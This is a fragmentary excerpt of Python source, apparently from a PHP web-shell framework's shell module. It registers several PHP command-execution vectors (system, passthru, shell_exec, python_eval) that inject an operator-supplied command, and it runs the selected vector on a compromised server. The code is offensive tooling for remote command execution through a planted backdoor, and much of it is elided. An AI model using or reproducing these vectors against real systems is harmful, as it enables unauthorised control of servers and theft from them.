...
class Sh(Module):
    ...
    def init(self):
        ...
        self.register_vectors([
            ...
            PhpCode("""@system('${command}${stderr_redirection}');""",
                    "system"),
            PhpCode("""@passthru('${command}${stderr_redirection}');""",
                    "passthru"),
            PhpCode(
                """print(@shell_exec('${command}${stderr_redirection}'));""",
                "shell_exec"),
            PhpCode(
            ...
            PhpCode(
                """@python_eval('import os; os.system('${command}${stderr_redirection}');');""",
                "python_eval"),
            PhpCode(
                """
    ...
    def run(self):
        ...
        return self.vectors.get_result(
            name=self.args['vector'], format_args=self.args)
